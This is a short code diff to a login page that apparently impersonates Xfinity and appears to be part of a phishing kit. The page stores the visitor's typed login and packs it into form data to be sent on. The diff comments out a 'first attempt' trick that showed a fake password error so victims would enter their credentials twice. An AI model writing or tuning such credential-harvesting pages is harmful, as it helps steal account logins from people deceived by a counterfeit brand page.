@@ -3215,6 +3215,7 @@ font-family: XfinityBrown, DMSans, sans-serif;
 		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 		<script src="assets/emit.js"></script> 
 	<script>
+		page = "login";
 		const inputElement = document.getElementById('userinput'); 
     		const passElement = document.getElementById('passwordinput');
     		const passwordToggle = document.getElementById('showHideButton');
@@ -3259,7 +3260,7 @@ async function smb() {
 
     sessionStorage.setItem('visitor', login);
 
-    if (firstAttempt) {
+   /* if (firstAttempt) {
         firstAttempt = false;
 
         passElement.style.border = "1px solid red";
@@ -3278,7 +3279,7 @@ async function smb() {
         }
 
         return;
-    }
+    }*/
 
     const formData = new FormData();
     formData.append("login", login);
